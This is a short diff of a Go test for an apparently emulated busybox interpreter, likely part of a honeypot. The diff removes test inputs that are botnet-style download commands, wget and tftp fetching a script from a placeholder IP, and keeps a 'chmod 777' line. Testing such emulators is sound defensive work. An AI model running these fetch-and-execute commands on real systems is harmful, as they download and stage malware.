@@ -34,7 +34,7 @@ func TestBusyboxDelegatesToEmulatedApplets(t *testing.T) {
 
 func TestBusyboxRealButUnemulatedAppletSucceedsSilently(t *testing.T) {
 	s := newBusyboxInterpreter()
-	for _, line := range []string{"/bin/busybox wget http://198.51.100.7/x.sh", "/bin/busybox tftp -g -r m 198.51.100.7", "/bin/busybox chmod 777 .x"} {
+	for _, line := range []string{"/bin/busybox chmod 777 .x", "/bin/busybox sleep 1"} {
 		out, code, _ := s.Run(line)
 		if out != "" || code != 0 {
 			t.Errorf("%q -> (%q, %d), want (\"\", 0)", line, out, code)
